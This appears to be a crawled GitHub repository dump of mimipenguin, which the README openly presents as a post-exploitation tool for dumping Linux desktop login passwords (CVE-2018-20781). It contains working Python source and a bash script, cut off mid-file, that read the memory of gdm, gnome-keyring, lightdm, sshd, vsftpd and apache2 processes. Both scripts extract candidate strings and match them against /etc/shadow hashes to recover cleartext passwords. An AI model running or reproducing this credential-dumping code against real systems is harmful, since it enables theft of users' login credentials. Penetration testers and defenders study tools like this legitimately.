{
  "metadata": {
    "timestamp": 1736709727874,
    "page": 125,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjEzMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "huntergregal/mimipenguin",
      "stars": 3860,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.037109375,
          "content": "mimipenguin\nmimipenguin_x32\n*.swp\n*.o\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 13.5146484375,
          "content": "Creative Commons Attribution 4.0 International Public License\nhttps://creativecommons.org/licenses/by/4.0/\n\nBy exercising the Licensed Rights (defined below), You accept and agree to be bound by the terms and conditions of this Creative Commons Attribution 4.0 International Public License (\"Public License\"). To the extent this Public License may be interpreted as a contract, You are granted the Licensed Rights in consideration of Your acceptance of these terms and conditions, and the Licensor grants You such rights in consideration of benefits the Licensor receives from making the Licensed Material available under these terms and conditions.\n\nSection 1 – Definitions.\n\nAdapted Material means material subject to Copyright and Similar Rights that is derived from or based upon the Licensed Material and in which the Licensed Material is translated, altered, arranged, transformed, or otherwise modified in a manner requiring permission under the Copyright and Similar Rights held by the Licensor. For purposes of this Public License, where the Licensed Material is a musical work, performance, or sound recording, Adapted Material is always produced where the Licensed Material is synched in timed relation with a moving image.\nAdapter's License means the license You apply to Your Copyright and Similar Rights in Your contributions to Adapted Material in accordance with the terms and conditions of this Public License.\nCopyright and Similar Rights means copyright and/or similar rights closely related to copyright including, without limitation, performance, broadcast, sound recording, and Sui Generis Database Rights, without regard to how the rights are labeled or categorized. For purposes of this Public License, the rights specified in Section 2(b)(1)-(2) are not Copyright and Similar Rights.\nEffective Technological Measures means those measures that, in the absence of proper authority, may not be circumvented under laws fulfilling obligations under Article 11 of the WIPO Copyright Treaty adopted on December 20, 1996, and/or similar international agreements.\nExceptions and Limitations means fair use, fair dealing, and/or any other exception or limitation to Copyright and Similar Rights that applies to Your use of the Licensed Material.\nLicensed Material means the artistic or literary work, database, or other material to which the Licensor applied this Public License.\nLicensed Rights means the rights granted to You subject to the terms and conditions of this Public License, which are limited to all Copyright and Similar Rights that apply to Your use of the Licensed Material and that the Licensor has authority to license.\nLicensor means the individual(s) or entity(ies) granting rights under this Public License.\nShare means to provide material to the public by any means or process that requires permission under the Licensed Rights, such as reproduction, public display, public performance, distribution, dissemination, communication, or importation, and to make material available to the public including in ways that members of the public may access the material from a place and at a time individually chosen by them.\nSui Generis Database Rights means rights other than copyright resulting from Directive 96/9/EC of the European Parliament and of the Council of 11 March 1996 on the legal protection of databases, as amended and/or succeeded, as well as other essentially equivalent rights anywhere in the world.\nYou means the individual or entity exercising the Licensed Rights under this Public License. Your has a corresponding meaning.\nSection 2 – Scope.\n\nLicense grant.\nSubject to the terms and conditions of this Public License, the Licensor hereby grants You a worldwide, royalty-free, non-sublicensable, non-exclusive, irrevocable license to exercise the Licensed Rights in the Licensed Material to:\nreproduce and Share the Licensed Material, in whole or in part; and\nproduce, reproduce, and Share Adapted Material.\nExceptions and Limitations. For the avoidance of doubt, where Exceptions and Limitations apply to Your use, this Public License does not apply, and You do not need to comply with its terms and conditions.\nTerm. The term of this Public License is specified in Section 6(a).\nMedia and formats; technical modifications allowed. The Licensor authorizes You to exercise the Licensed Rights in all media and formats whether now known or hereafter created, and to make technical modifications necessary to do so. The Licensor waives and/or agrees not to assert any right or authority to forbid You from making technical modifications necessary to exercise the Licensed Rights, including technical modifications necessary to circumvent Effective Technological Measures. For purposes of this Public License, simply making modifications authorized by this Section 2(a)(4) never produces Adapted Material.\nDownstream recipients.\nOffer from the Licensor – Licensed Material. Every recipient of the Licensed Material automatically receives an offer from the Licensor to exercise the Licensed Rights under the terms and conditions of this Public License.\nNo downstream restrictions. You may not offer or impose any additional or different terms or conditions on, or apply any Effective Technological Measures to, the Licensed Material if doing so restricts exercise of the Licensed Rights by any recipient of the Licensed Material.\nNo endorsement. Nothing in this Public License constitutes or may be construed as permission to assert or imply that You are, or that Your use of the Licensed Material is, connected with, or sponsored, endorsed, or granted official status by, the Licensor or others designated to receive attribution as provided in Section 3(a)(1)(A)(i).\nOther rights.\n\nMoral rights, such as the right of integrity, are not licensed under this Public License, nor are publicity, privacy, and/or other similar personality rights; however, to the extent possible, the Licensor waives and/or agrees not to assert any such rights held by the Licensor to the limited extent necessary to allow You to exercise the Licensed Rights, but not otherwise.\nPatent and trademark rights are not licensed under this Public License.\nTo the extent possible, the Licensor waives any right to collect royalties from You for the exercise of the Licensed Rights, whether directly or through a collecting society under any voluntary or waivable statutory or compulsory licensing scheme. In all other cases the Licensor expressly reserves any right to collect such royalties.\nSection 3 – License Conditions.\n\nYour exercise of the Licensed Rights is expressly made subject to the following conditions.\n\nAttribution.\n\nIf You Share the Licensed Material (including in modified form), You must:\n\nretain the following if it is supplied by the Licensor with the Licensed Material:\nidentification of the creator(s) of the Licensed Material and any others designated to receive attribution, in any reasonable manner requested by the Licensor (including by pseudonym if designated);\na copyright notice;\na notice that refers to this Public License;\na notice that refers to the disclaimer of warranties;\na URI or hyperlink to the Licensed Material to the extent reasonably practicable;\nindicate if You modified the Licensed Material and retain an indication of any previous modifications; and\nindicate the Licensed Material is licensed under this Public License, and include the text of, or the URI or hyperlink to, this Public License.\nYou may satisfy the conditions in Section 3(a)(1) in any reasonable manner based on the medium, means, and context in which You Share the Licensed Material. For example, it may be reasonable to satisfy the conditions by providing a URI or hyperlink to a resource that includes the required information.\nIf requested by the Licensor, You must remove any of the information required by Section 3(a)(1)(A) to the extent reasonably practicable.\nIf You Share Adapted Material You produce, the Adapter's License You apply must not prevent recipients of the Adapted Material from complying with this Public License.\nSection 4 – Sui Generis Database Rights.\n\nWhere the Licensed Rights include Sui Generis Database Rights that apply to Your use of the Licensed Material:\n\nfor the avoidance of doubt, Section 2(a)(1) grants You the right to extract, reuse, reproduce, and Share all or a substantial portion of the contents of the database;\nif You include all or a substantial portion of the database contents in a database in which You have Sui Generis Database Rights, then the database in which You have Sui Generis Database Rights (but not its individual contents) is Adapted Material; and\nYou must comply with the conditions in Section 3(a) if You Share all or a substantial portion of the contents of the database.\nFor the avoidance of doubt, this Section 4 supplements and does not replace Your obligations under this Public License where the Licensed Rights include other Copyright and Similar Rights.\nSection 5 – Disclaimer of Warranties and Limitation of Liability.\n\nUnless otherwise separately undertaken by the Licensor, to the extent possible, the Licensor offers the Licensed Material as-is and as-available, and makes no representations or warranties of any kind concerning the Licensed Material, whether express, implied, statutory, or other. This includes, without limitation, warranties of title, merchantability, fitness for a particular purpose, non-infringement, absence of latent or other defects, accuracy, or the presence or absence of errors, whether or not known or discoverable. Where disclaimers of warranties are not allowed in full or in part, this disclaimer may not apply to You.\nTo the extent possible, in no event will the Licensor be liable to You on any legal theory (including, without limitation, negligence) or otherwise for any direct, special, indirect, incidental, consequential, punitive, exemplary, or other losses, costs, expenses, or damages arising out of this Public License or use of the Licensed Material, even if the Licensor has been advised of the possibility of such losses, costs, expenses, or damages. Where a limitation of liability is not allowed in full or in part, this limitation may not apply to You.\nThe disclaimer of warranties and limitation of liability provided above shall be interpreted in a manner that, to the extent possible, most closely approximates an absolute disclaimer and waiver of all liability.\nSection 6 – Term and Termination.\n\nThis Public License applies for the term of the Copyright and Similar Rights licensed here. However, if You fail to comply with this Public License, then Your rights under this Public License terminate automatically.\nWhere Your right to use the Licensed Material has terminated under Section 6(a), it reinstates:\n\nautomatically as of the date the violation is cured, provided it is cured within 30 days of Your discovery of the violation; or\nupon express reinstatement by the Licensor.\nFor the avoidance of doubt, this Section 6(b) does not affect any right the Licensor may have to seek remedies for Your violations of this Public License.\nFor the avoidance of doubt, the Licensor may also offer the Licensed Material under separate terms or conditions or stop distributing the Licensed Material at any time; however, doing so will not terminate this Public License.\nSections 1, 5, 6, 7, and 8 survive termination of this Public License.\nSection 7 – Other Terms and Conditions.\n\nThe Licensor shall not be bound by any additional or different terms or conditions communicated by You unless expressly agreed.\nAny arrangements, understandings, or agreements regarding the Licensed Material not stated herein are separate from and independent of the terms and conditions of this Public License.\nSection 8 – Interpretation.\n\nFor the avoidance of doubt, this Public License does not, and shall not be interpreted to, reduce, limit, restrict, or impose conditions on any use of the Licensed Material that could lawfully be made without permission under this Public License.\nTo the extent possible, if any provision of this Public License is deemed unenforceable, it shall be automatically reformed to the minimum extent necessary to make it enforceable. If the provision cannot be reformed, it shall be severed from this Public License without affecting the enforceability of the remaining terms and conditions.\nNo term or condition of this Public License will be waived and no failure to comply consented to unless expressly agreed to by the Licensor.\nNothing in this Public License constitutes or may be interpreted as a limitation upon, or waiver of, any privileges and immunities that apply to the Licensor or You, including from the legal processes of any jurisdiction or authority.\nCreative Commons is not a party to its public licenses. Notwithstanding, Creative Commons may elect to apply one of its public licenses to material it publishes and in those instances will be considered the “Licensor.” The text of the Creative Commons public licenses is dedicated to the public domain under the CC0 Public Domain Dedication. Except for the limited purpose of indicating that material is shared under a Creative Commons public license or as otherwise permitted by the Creative Commons policies published at creativecommons.org/policies, Creative Commons does not authorize the use of the trademark “Creative Commons” or any other trademark or logo of Creative Commons without its prior written consent including, without limitation, in connection with any unauthorized modifications to any of its public licenses or any other arrangements, understandings, or agreements concerning use of licensed material. For the avoidance of doubt, this paragraph does not form part of the public licenses.\n\nCreative Commons may be contacted at creativecommons.org.\n"
        },
        {
          "name": "Makefile",
          "type": "blob",
          "size": 0.9482421875,
          "content": "CC=gcc\nSTRIP=strip --strip-unneeded\nCFLAGS=-Iinclude/ -D_FILE_OFFSET_BITS=64 -O3 -Wno-unused-result\nLDFLAGS=-lcrypt\n\nall: \n\t@$(CC) $(CFLAGS) src/scanner.c src/users.c src/targets.c src/mimipenguin.c -o mimipenguin $(LDFLAGS)\n\t@$(CC) $(CFLAGS) -m32 src/scanner.c src/users.c src/targets.c src/mimipenguin.c -o mimipenguin_x32 $(LDFLAGS)\n\t@$(STRIP) mimipenguin\n\t@$(STRIP) mimipenguin_x32\n\nstatic: \n\t@$(CC) $(CFLAGS) -static src/scanner.c src/users.c src/targets.c src/mimipenguin.c -o mimipenguin $(LDFLAGS)\n\t@$(CC) $(CFLAGS) -m32 -static src/scanner.c src/users.c src/targets.c src/mimipenguin.c -o mimipenguin_x32 $(LDFLAGS)\n\t@$(STRIP) mimipenguin\n\t@$(STRIP) mimipenguin_x32\ndebug: \n\t@$(CC) $(CFLAGS) -DDEBUG src/scanner.c src/users.c src/targets.c src/mimipenguin.c -o mimipenguin $(LDFLAGS)\n\t@$(CC) $(CFLAGS) -m32 -DDEBUG src/scanner.c src/users.c src/targets.c src/mimipenguin.c -o mimipenguin_x32 $(LDFLAGS)\n\nclean:\n\t@rm mimipenguin\n\t@rm mimipenguin_x32\n\n.PHONY: all\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 4.396484375,
          "content": "# MimiPenguin 2.0\nA tool to dump the login password from the current linux desktop user. Adapted from the idea behind the popular Windows tool mimikatz. This was assigned *CVE-2018-20781* (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781). Fun fact it's still not fixed after GNOME Keyring 3.27.2 and still works as of `3.28.0.2-1ubuntu1.18.04.1`.\n\n![alt text](http://i.imgur.com/BkDX9dF.png \"MimiPenguin\")\n\n## Details\nTakes advantage of cleartext credentials in memory by dumping the process and extracting lines that have a high probability of containing cleartext passwords. Will attempt to calculate each word's probability by checking hashes in /etc/shadow, hashes in memory, and regex searches. 2.0 introduces a clean C port that aims to increase the speed of execution and portability\n\n## Known Issues\n* The 32bit variant of mimipenguin (C build) may fail in a 64bit userspace as it currently does not adequatley handle searching a 64bit address space\n\n## Requires\n* root permissions\n\n## Supported/Tested Systems\n* Kali 4.3.0 (rolling) x64 (gdm3)\n* Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)\n* Ubuntu Desktop 14.04.1 LTS x64 (Gnome Keyring 3.10.1-1ubuntu4.3, LightDM 1.10.6-0ubuntu1)\n* Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)\n* Ubuntu Desktop 16.04.4 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2, LightDM 1.18.3-0ubuntu1.1)\n* Ubuntu 18\n* XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2)\n* Archlinux x64 Gnome 3 (Gnome Keyring 3.20)\n* OpenSUSE Leap 42.2 x64 (Gnome Keyring 3.20)\n* VSFTPd 3.0.3-8+b1 (Active FTP client connections)\n* Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions) [Gcore dependency]\n* openssh-server 1:7.3p1-1 (Active SSH connections - sudo usage)\n\n## Building\n* To Build the C variant release simply run `make` in the root directory of the project\n* To build a debug binary with debug prints run `make debug`\n* To build a static linked binaries run `make static`\n\n## Notes\n* Password moves in memory - still honing in on 100% effectiveness\n* Plan on expanding support and other credential locations\n* Working on expanding to non-desktop environments\n* Known bug - sometimes gcore hangs the script, this is a problem with gcore\n* Open to pull requests and community research\n* LDAP research (nscld winbind etc) planned for future\n\n## Development Roadmap\n* Implement needles in C port (speed up)\n* Add optional arg to target specific users only (speed up)\n\nMimiPenguin is slowly being ported to multiple languages to support all possible post-exploit scenarios. The roadmap below was suggested by KINGSABRI to track the various versions and features. An \"X\" denotes full support while a \"~\" denotes a feature with known bugs.\n\n| Feature                                           | .sh | .py |\n|---------------------------------------------------|-----|-----|\n| GDM password (Kali Desktop, Debian Desktop)       | ~   | X   |\n| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | ~   | X   |\n| LightDM (Ubuntu Desktop)                          | X   | X   |\n| VSFTPd (Active FTP Connections)                   | X   | X   |\n| Apache2 (Active HTTP Basic Auth Sessions)         | ~   | ~   |\n| OpenSSH (Active SSH Sessions - Sudo Usage)        | ~   | ~   |\n\n## Contact\n* Twitter: [@huntergregal](https://twitter.com/HunterGregal)\n* Website: [huntergregal.com](http://huntergregal.com)\n* Github: [huntergregal](https://github.com/huntergregal)\n\n## Licence\nCC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/\n\n## Special Thanks \n* the-useless-one for remove Gcore as a dependency, cleaning up tabs, adding output option, and a full python3 port\n* gentilkiwi for Mimikatz, the inspiration and the twitter shoutout\n* pugilist for cleaning up PID extraction and testing\n* ianmiell for cleaning up some of my messy code\n* w0rm for identifying printf error when special chars are involved\n* benichmt1 for identifying multiple authenticate users issue\n* ChaitanyaHaritash for identifying special char edge case issues\n* ImAWizardLizard for cleaning up the pattern matches with a for loop\n* coreb1t for python3 checks, arch support, other fixes\n* n1nj4sec for a python2 port and support\n* KINGSABRI for the Roadmap proposal\n* bourgouinadrien for linking https://github.com/koalaman/shellcheck\n* bcoles for adding more needles\n* space-r7 and bcoles for work on the [Metasploit MimiPenguin module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/linux/gather/mimipenguin.md) port\n"
        },
        {
          "name": "include",
          "type": "tree",
          "content": null
        },
        {
          "name": "mimipenguin.py",
          "type": "blob",
          "size": 8.583984375,
          "content": "#!/usr/bin/env python3\n#   -*- encoding: utf8 -*-\n#   Rewrite of mimipenguin in Python 3.\n#   Original idea from Hunter Gregal (@huntergregal).\n#   Implementation by Yannick Méheut (github.com/the-useless-one)\n#   Copyright © 2017, Yannick Méheut <yannick@meheut.org>\n\n#   This program is free software: you can redistribute it and/or modify\n#   it under the terms of the GNU General Public License as published by\n#   the Free Software Foundation, either version 3 of the License, or\n#   (at your option) any later version.\n#\n#   This program is distributed in the hope that it will be useful,\n#   but WITHOUT ANY WARRANTY; without even the implied warranty of\n#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#   GNU General Public License for more details.\n\n#   You should have received a copy of the GNU General Public License\n#   along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nfrom __future__ import print_function\n\nimport os\nimport platform\nimport re\nimport base64\nimport binascii\nimport crypt\nimport string\n\n\ndef running_as_root():\n    return os.geteuid() == 0\n\n\ndef get_linux_distribution():\n    try:\n        return platform.dist()[0].lower()\n    except IndexError:\n        return str()\n\n\ndef compute_hash(ctype, salt, password):\n    return crypt.crypt(password, '{}{}'.format(ctype, salt))\n\n\ndef strings(s, min_length=4):\n    strings_result = list()\n    result = str()\n\n    for c in s:\n        try:\n            c = chr(c)\n        except TypeError:\n            # In Python 2, c is already a chr\n            pass\n        if c in string.printable:\n            result += c\n        else:\n            if len(result) >= min_length:\n                strings_result.append(result)\n            result = str()\n\n    return strings_result\n\n\ndef dump_process(pid):\n    dump_result = bytes()\n\n    with open('/proc/{}/maps'.format(pid), 'r') as maps_file:\n        for l in maps_file.readlines():\n            memrange, attributes = l.split(' ')[:2]\n            if attributes.startswith('r'):\n                memrange_start, memrange_stop = [\n                    int(x, 16) for x in memrange.split('-')]\n                memrange_size = memrange_stop - memrange_start\n                with open('/proc/{}/mem'.format(pid), 'rb') as mem_file:\n                    try:\n                        mem_file.seek(memrange_start)\n                        dump_result += mem_file.read(memrange_size)\n                    except (OSError, ValueError, IOError, OverflowError):\n                        pass\n\n    return dump_result\n\n\ndef find_pid(process_name):\n    pids = list()\n\n    for pid in os.listdir('/proc'):\n        try:\n            with open('/proc/{}/cmdline'.format(pid), 'rb') as cmdline_file:\n                if process_name in cmdline_file.read().decode():\n                    pids.append(pid)\n        except IOError:\n            continue\n\n    return pids\n\n\nclass PasswordFinder:\n    _hash_re = r'^\\$.\\$.+$'\n\n    def __init__(self):\n        self._potential_passwords = list()\n        self._strings_dump = list()\n        self._found_hashes = list()\n\n    def _dump_target_processes(self):\n        target_pids = list()\n        for target_process in self._target_processes:\n            target_pids += find_pid(target_process)\n        for target_pid in target_pids:\n            self._strings_dump += strings(dump_process(target_pid))\n\n    def _find_hash(self):\n        for s in self._strings_dump:\n            if re.match(PasswordFinder._hash_re, s):\n                self._found_hashes.append(s)\n\n    def _find_potential_passwords(self):\n        for needle in self._needles:\n            needle_indexes = [i for i, s in enumerate(self._strings_dump)\n                              if re.search(needle, s)]\n            for needle_index in needle_indexes:\n                self._potential_passwords += self._strings_dump[\n                    needle_index - 10:needle_index + 10]\n        self._potential_passwords = list(set(self._potential_passwords))\n\n    def _try_potential_passwords(self):\n        valid_passwords = list()\n        found_hashes = list()\n        pw_hash_to_user = dict()\n\n        if self._found_hashes:\n            found_hashes = self._found_hashes\n        with open('/etc/shadow', 'r') as f:\n            for l in f.readlines():\n                user, pw_hash = l.split(':')[:2]\n                if not re.match(PasswordFinder._hash_re, pw_hash):\n                    continue\n                found_hashes.append(pw_hash)\n                pw_hash_to_user[pw_hash] = user\n\n        found_hashes = list(set(found_hashes))\n\n        for found_hash in found_hashes:\n            ctype = found_hash[:3]\n            salt = found_hash.split('$')[2]\n            for potential_password in self._potential_passwords:\n                potential_hash = compute_hash(ctype, salt, potential_password)\n                if potential_hash == found_hash:\n                    try:\n                        valid_passwords.append(\n                            (pw_hash_to_user[found_hash], potential_password))\n                    except KeyError:\n                        valid_passwords.append(\n                            ('<unknown user>', potential_password))\n\n        return valid_passwords\n\n    def dump_passwords(self):\n        self._dump_target_processes()\n        self._find_hash()\n        self._find_potential_passwords()\n\n        return self._try_potential_passwords()\n\n\nclass GdmPasswordFinder(PasswordFinder):\n    def __init__(self):\n        PasswordFinder.__init__(self)\n        self._source_name = '[SYSTEM - GNOME]'\n        self._target_processes = ['gdm-password']\n        self._needles = ['^_pammodutil_getpwnam_root_1$',\n                         '^gkr_system_authtok$']\n\n\nclass GnomeKeyringPasswordFinder(PasswordFinder):\n    def __init__(self):\n        PasswordFinder.__init__(self)\n        self._source_name = '[SYSTEM - GNOME]'\n        self._target_processes = ['gnome-keyring-daemon']\n        self._needles = [r'^.+libgck\\-1\\.so\\.0$', r'libgcrypt\\.so\\..+$', r'linux-vdso\\.so\\.1$']\n\nclass LightDmPasswordFinder(PasswordFinder):\n    def __init__(self):\n        PasswordFinder.__init__(self)\n        self._source_name = '[SYSTEM - LIGHTDM]'\n        self._target_processes = ['lightdm']\n        self._needles = [r'^_pammodutil_getspnam_']\n\nclass VsftpdPasswordFinder(PasswordFinder):\n    def __init__(self):\n        PasswordFinder.__init__(self)\n        self._source_name = '[SYSTEM - VSFTPD]'\n        self._target_processes = ['vsftpd']\n        self._needles = [\n            r'^::.+\\:[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$']\n\n\nclass SshdPasswordFinder(PasswordFinder):\n    def __init__(self):\n        PasswordFinder.__init__(self)\n        self._source_name = '[SYSTEM - SSH]'\n        self._target_processes = ['sshd:']\n        self._needles = [r'^sudo.+']\n\n\nclass ApachePasswordFinder(PasswordFinder):\n    def __init__(self):\n        PasswordFinder.__init__(self)\n        self._source_name = '[HTTP BASIC - APACHE2]'\n        self._target_processes = ['apache2']\n        self._needles = [r'^Authorization: Basic.+']\n\n    def _try_potential_passwords(self):\n        valid_passwords = list()\n\n        for potential_password in self._potential_passwords:\n            try:\n                potential_password = base64.b64decode(potential_password)\n            except binascii.Error:\n                continue\n            else:\n                try:\n                    user, password = potential_password.split(':', maxsplit=1)\n                    valid_passwords.append((user, password))\n                except IndexError:\n                    continue\n\n        return valid_passwords\n\n    def dump_passwords(self):\n        self._dump_target_processes()\n        self._find_potential_passwords()\n\n        return self._try_potential_passwords()\n\n\ndef main():\n    if not running_as_root():\n        raise RuntimeError('mimipenguin should be ran as root')\n\n    password_finders = list()\n\n    if find_pid('gdm-password'):\n        password_finders.append(GdmPasswordFinder())\n    if find_pid('gnome-keyring-daemon'):\n        password_finders.append(GnomeKeyringPasswordFinder())\n    if find_pid('lightdm'):\n        password_finders.append(LightDmPasswordFinder())\n    if os.path.isfile('/etc/vsftpd.conf'):\n        password_finders.append(VsftpdPasswordFinder())\n    if os.path.isfile('/etc/ssh/sshd_config'):\n        password_finders.append(SshdPasswordFinder())\n    if os.path.isfile('/etc/apache2/apache2.conf'):\n        password_finders.append(ApachePasswordFinder())\n\n    for password_finder in password_finders:\n        for valid_passwords in password_finder.dump_passwords():\n            print('{}\\t{}:{}'.format(password_finder._source_name,\n                                     valid_passwords[0], valid_passwords[1]))\n\n\nif __name__ == '__main__':\n    main()\n"
        },
        {
          "name": "mimipenguin.sh",
          "type": "blob",
          "size": 10.21484375,
          "content": "#!/bin/bash\n\n# Author: Hunter Gregal\n# Github: /huntergregal Twitter: /huntergregal Site: huntergregal.com\n# Dumps cleartext credentials from memory\n\n#root check\nif [[ \"$EUID\" -ne 0 ]]; then\n    echo \"Root required - You are dumping memory...\"\n    echo \"Even mimikatz requires administrator\"\n    exit 1\nfi\n\n#Store results to cleanup later\nexport RESULTS=\"\"\n\n# check if a command exists in $PATH\ncommand_exists () {\n\n  command -v \"${1}\" >/dev/null 2>&1\n}\n\n# check for required executables in $PATH\nif ! command_exists strings; then\n    echo \"Error: command 'strings' not found in ${PATH}\"\n    exit 1\nfi\nif ! command_exists grep; then\n    echo \"Error: command 'grep' not found in ${PATH}\"\n    exit 1\nfi\n\n# Check for any of the currently tested versions of Python\nif command_exists python2; then\n    pycmd=python2\nelif command_exists python2.7; then\n    pycmd=python2.7\nelif command_exists python3; then\n    pycmd=python3\nelif command_exists python3.6; then\n    pycmd=python3.6\nelif command_exists python3.7; then\n    pycmd=python3.7\nelse\n    echo \"Error: No supported version of 'python' found in ${PATH}\"\n    exit 1\nfi\n\n# $1 = PID, $2 = output_file, $3 = operating system\nfunction dump_pid () {\n\n    system=$3\n    pid=$1\n    output_file=$2\n    if [[ $system == \"kali\" ]]; then\n        mem_maps=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | grep -E 'heap|stack' | cut -d' ' -f 1)\n    else\n        mem_maps=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1)\n    fi\n    while read -r memrange; do\n        memrange_start=$(echo \"$memrange\" | cut -d\"-\" -f 1)\n        memrange_start=$(printf \"%u\\n\" 0x\"$memrange_start\")\n        memrange_stop=$(echo \"$memrange\" | cut -d\"-\" -f 2)\n        memrange_stop=$(printf \"%u\\n\" 0x\"$memrange_stop\")\n        memrange_size=$((memrange_stop - memrange_start))\n        dd if=/proc/\"$pid\"/mem of=\"${output_file}\".\"${pid}\" ibs=1 oflag=append conv=notrunc \\\n            skip=\"$memrange_start\" count=\"$memrange_size\" > /dev/null 2>&1\n    done <<< \"$mem_maps\"\n}\n\n\n\n# $1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE\nfunction parse_pass () {\n\n    #If hash not in dump get shadow hashes\n    if [[ ! \"$2\" ]]; then\n            SHADOWHASHES=\"$(cut -d':' -f 2 /etc/shadow | grep -E '^\\$.\\$')\"\n    fi\n\n    #Determine password potential for each word\n    while read -r line; do\n        #If hash in dump, prepare crypt line\n        if [[ \"$2\" ]]; then\n            #get ctype\n            CTYPE=\"$(echo \"$2\" | cut -c-3)\"\n            #Escape quotes, backslashes, single quotes to pass into crypt\n            SAFE=$(echo \"$line\" | sed 's/\\\\/\\\\\\\\/g; s/\\\"/\\\\\"/g; s/'\"'\"'/\\\\'\"'\"'/g;')\n            CRYPT=\"\\\"$SAFE\\\", \\\"$CTYPE$3\\\"\"\n            if [[ $($pycmd -c \"from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))\") == \"$2\" ]]; then\n                #Find which user's password it is (useful if used more than once!)\n                USER=\"$(grep \"${2}\" /etc/shadow | cut -d':' -f 1)\"\n                export RESULTS=\"$RESULTS$4          $USER:$line \\n\"\n            fi\n        #Else use shadow hashes\n        elif [[ $SHADOWHASHES ]]; then\n            while read -r thishash; do\n                CTYPE=\"$(echo \"$thishash\" | cut -c-3)\"\n                SHADOWSALT=\"$(echo \"$thishash\" | cut -d'$' -f 3)\"\n                #Escape quotes, backslashes, single quotes to pass into crypt\n                SAFE=$(echo \"$line\" | sed 's/\\\\/\\\\\\\\/g; s/\\\"/\\\\\"/g; s/'\"'\"'/\\\\'\"'\"'/g;')\n                CRYPT=\"\\\"$SAFE\\\", \\\"$CTYPE$SHADOWSALT\\\"\"\n                if [[ $($pycmd -c \"from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))\") == \"$thishash\" ]]; then\n                    #Find which user's password it is (useful if used more than once!)\n                    USER=\"$(grep \"${thishash}\" /etc/shadow | cut -d':' -f 1)\"\n                    export RESULTS=\"$RESULTS$4          $USER:$line\\n\"\n                fi\n            done <<< \"$SHADOWHASHES\"\n        #if no hash data - revert to checking probability\n        else\n        patterns=(\"^_pammodutil.+[0-9]$\"\\\n                 \"^LOGNAME=\"\\\n                 \"UTF-8\"\\\n                 \"^splayManager[0-9]$\"\\\n                 \"^gkr_system_authtok$\"\\\n                 \"[0-9]{1,4}:[0-9]{1,4}:\"\\\n                 \"Manager\\.Worker\"\\\n                 \"/usr/share\"\\\n                 \"/bin\"\\\n                 \"\\.so\\.[0-1]$\"\\\n                 \"x86_64\"\\\n                 \"(aoao)\"\\\n                 \"stuv\")\n        export RESULTS=\"$RESULTS[HIGH]$4            $line\\n\"\n        for pattern in \"${patterns[@]}\"; do\n          if [[ $line =~ $pattern ]]; then\n            export RESULTS=\"$RESULTS[LOW]$4         $line\\n\"\n          fi\n        done\n        fi\n    done <<< \"$1\"\n} # end parse_pass\n\n\n#Support Kali\nif [[ $(uname -a | awk '{print tolower($0)}') == *\"kali\"* ]]; then\n    SOURCE=\"[SYSTEM - GNOME]\"\n    #get gdm-session-worker [pam/gdm-password] process\n    PID=\"$(ps -eo pid,command | sed -rn '/gdm-password\\]/p' | awk -F ' ' '{ print $1 }')\"\n    #if exists aka someone logged into gnome then extract...\n    if [[ $PID ]];then\n        while read -r pid; do\n            dump_pid \"$pid\" /tmp/dump \"kali\"\n            HASH=\"$(strings \"/tmp/dump.${pid}\" | grep -E -m 1 '^\\$.\\$.+\\$')\"\n            SALT=\"$(echo \"$HASH\" | cut -d'$' -f 3)\"\n            DUMP=\"$(strings \"/tmp/dump.${pid}\" | grep -E '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)\"\n            DUMP=\"${DUMP}$(strings \"/tmp/dump.${pid}\" | grep -E '^gkr_system_authtok$' -B 5 -A 5)\"\n            #Remove dupes to speed up processing\n            DUMP=$(echo \"$DUMP\" | tr \" \" \"\\n\" |sort -u)\n            parse_pass \"$DUMP\" \"$HASH\" \"$SALT\" \"$SOURCE\" \n    \n            #cleanup\n            rm -rf \"/tmp/dump.${pid}\"\n        done <<< \"$PID\"\n    fi\nfi\n\n#Support gnome-keyring\nif [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then\n\n        SOURCE=\"[SYSTEM - GNOME]\"\n        #get /usr/bin/gnome-keyring-daemon process\n        PID=\"$(ps -eo pid,command | sed -rn '/gnome\\-keyring\\-daemon/p' | awk -F ' ' '{ print $1 }')\"\n\n    #if exists aka someone logged into gnome then extract...\n    if [[ $PID ]];then\n        while read -r pid; do\n            dump_pid \"$pid\" /tmp/dump\n            HASH=\"$(strings \"/tmp/dump.${pid}\" | grep -E -m 1 '^\\$.\\$.+\\$')\"\n            SALT=\"$(echo \"$HASH\" | cut -d'$' -f 3)\"\n            DUMP=$(strings \"/tmp/dump.${pid}\" | grep -E '^.+libgck\\-1\\.so\\.0$' -B 10 -A 10)\n            DUMP+=$(strings \"/tmp/dump.${pid}\" | grep -E -A 5 -B 5 'libgcrypt\\.so\\..+$')\n            #Remove dupes to speed up processing\n            DUMP=$(echo \"$DUMP\" | tr \" \" \"\\n\" |sort -u)\n            parse_pass \"$DUMP\" \"$HASH\" \"$SALT\" \"$SOURCE\" \n            #cleanup\n            rm -rf 